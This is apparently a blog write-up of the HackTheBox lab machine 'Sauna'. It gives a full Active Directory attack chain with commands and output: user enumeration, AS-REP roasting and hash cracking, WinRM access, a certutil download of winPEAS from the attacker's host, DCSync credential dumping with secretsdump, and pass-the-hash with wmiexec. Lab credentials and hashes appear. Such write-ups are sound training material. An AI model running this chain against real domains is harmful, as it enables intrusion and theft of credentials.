---
layout: post
title:  "Sauna (HackTheBox) Writeup"
date:   2026-01-30 13:00:00 +0530
categories: [HackTheBox, Active Directory]
---


**Sauna** is designed to teach Active Directory enumeration and exploitation on Windows. Instead of just brute-forcing a login, it walks you through a full AD attack chain — from deriving useful usernames to escalating privileges via legitimate AD features.

**Hack The Box:  [Sauna](https://www.hackthebox.com/machines/sauna)

## Enumeration

Starting with the nmap scan.

```
❯ nmap -p 1-10000 -sCV -O -T4 10.129.95.180

Nmap scan report for 10.129.95.180
Host is up (0.55s latency).
Not shown: 9986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-29 12:49:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (91%), Microsoft Windows 10 1903 - 21H1 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h58m06s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-29T12:50:47
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1318.58 seconds

```

The result showed that the target is a Windows Active Directory Domain Controller. The domain was identified as **EGOTISTICAL-BANK.LOCAL**. 

Next, I used **Kerbrute** to enumerate valid Active Directory usernames. I came across two valid domain users and saved them into a `.txt` file, which was later used to perform **AS-REP roasting**.

```
❯ kerbrute userenum \
  -d EGOTISTICAL-BANK.LOCAL \
  --dc 10.129.95.180 \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --threads 50

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/29/26 - Ronnie Flathers @ropnop

2026/01/29 11:25:12 >  Using KDC(s):
2026/01/29 11:25:12 >   10.129.95.180:88

2026/01/29 11:26:03 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2026/01/29 11:29:25 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2026/01/29 11:29:57 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2026/01/29 11:31:46 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL

```

Using `GetNPUsers.py` to perform AS-REP roasting and i got the hash for user **fsmith**, indicating Kerberos pre-authentication was not required for this account.

```
❯ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ \
  -dc-ip 10.129.95.180 \
  -usersfile user.txt \
  -no-pass

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bc5f36e74e2019297e81b56bf453c82b$f18e8c5f552c46f266941b3de9df3ed0061c8e10cd0d9c9ad8488527ac0d13249df32efc1c664515acdcd4881e865c6e9432b7d7ed4c3ca742815852695e9947c3b6958a8de768820fb63e436241594229cdc88ff1f60cf8379cba6110b3a26daa49fe7cf32b21fb8fbc4f8908ac2e8baec405895504aef62560dd723cbb6d85f209e53d9fc3c7a5c2d55b8fb88bfa97cc1763e9168e892447c2c23ff62356f3fc7aee2244a3479cdc51b2bfbbc15bf18553d38e78eb80e4c2ac68c6df7010c5473e4698ed584e07928a0351a7439500ee2d234f78bf54a567cf4072211168f71faa4c4328db59a9b294de995ca0b6523ec5065940d6539b81987bf5beeeab39
```

I used **hascat** to crack the hash for user **fsmith**.

```
❯ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt

password: Thestrokes23
```

```
user : fsmith
password: Thestrokes23
```

Using the cracked credentials for **fsmith**, I used `WinRM` to get the shell on the target system. I navigated to the user’s Desktop to retrieve the `user` flag.

```
❯  evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23

*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
25aecac2b52a488e71d5a9**********

```

## Privilege Escalation

With the valid credential for user `fsmith` , I already have the shell and  started a python server on my local machine to upload `winpeas`  to enumerate the system for privilege escalation opportunities, stored credentials, etc.

```
❯ python3 -m http.server 8000

```

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> certutil -urlcache -split -f http://10.10.16.12:8000/winPEASx64.exe winpeas.exe
 
****  Online  ****
  000000  ...
  9c7800
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\FSmith\Documents> dir


    Directory: C:\Users\FSmith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/29/2026   6:29 AM       10254336 winpeas.exe

*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winpeas.exe



svc_loanmgr
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```

After executing **winPEAS**, sensitive **AutoLogon credentials** were discovered. This revealed plaintext credentials for the service account **svc_loanmanager**.

```
user:         svc_loanmgr
password:     Moneymakestheworldgoround!
```

## bloodhound

I used `bloodhound-python` to enumerate Active Directory objects and relationships. Using BloodHound’s pathfinding feature, I identified a privilege escalation path from the service account **svc_loanmanager** to the **Administrator** account.

```
❯ bloodhound-python \
  -u fsmith \
  -p 'Thestrokes23' \
  -d EGOTISTICAL-BANK.LOCAL \
  -ns 10.129.95.180 \
  -c All

```

The service account **svc_loanmanager** had **DCSync** rights, allowing it to abuse directory replication permissions to extract password hashes for high-privileged domain accounts.

!![](/assets/image/sauna/Screenshot%202026-01-30%20171347.png)

With **DCSync** privileges, I was able to abuse this permission using `secretsdump.py`. This attack allowed me to request a copy of Active Directory credential data directly from the Domain Controller. 

```
❯ secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.129.95.180
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:6bbd9c82412947c91d1343d12eea9946:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:d17761da4be263200bbdaf0eda26102e2ab6575045ccf3bba324dbf2172443a8
SAUNA$:aes128-cts-hmac-sha1-96:1cdea3ce87f62f7d36d905309715132b
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up... 
```

The last step is to use the NTLM hash for the **Administrator** account using `wmiexec` to get the shell on the target machine and retrieve the `root` flag from the administrator’s desktop.

```
❯ wmiexec.py EGOTISTICAL-BANK.LOCAL/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd Users\Administrator\Desktop\
C:\Users\Administrator\Desktop>type root.txt
d5ae85d0d0cb7de2f4eac3**********

```